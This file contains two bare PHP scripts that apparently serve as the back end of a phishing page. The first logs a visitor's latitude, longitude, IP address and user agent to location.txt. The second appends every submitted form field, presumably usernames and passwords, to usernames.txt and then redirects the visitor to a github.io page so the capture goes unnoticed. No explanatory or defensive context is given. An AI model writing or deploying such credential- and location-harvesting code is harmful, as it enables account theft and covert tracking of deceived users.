
<?php
$myfile = fopen("location.txt", "w");
$txt = "lat: ".$_GET["lat"] . "\nlong: :" . $_GET["long"]. "\nIP:" .  $_SERVER["REMOTE_ADDR"] . "\nUser agent" . $_GET["uagent"];
fwrite($myfile, $txt); 
fclose($myfile);

?>




<?php
header
('location:');
$handle=fopen("usernames.txt", "a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"-");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://alshakil83.github.io/new-45/");
exit;
?>
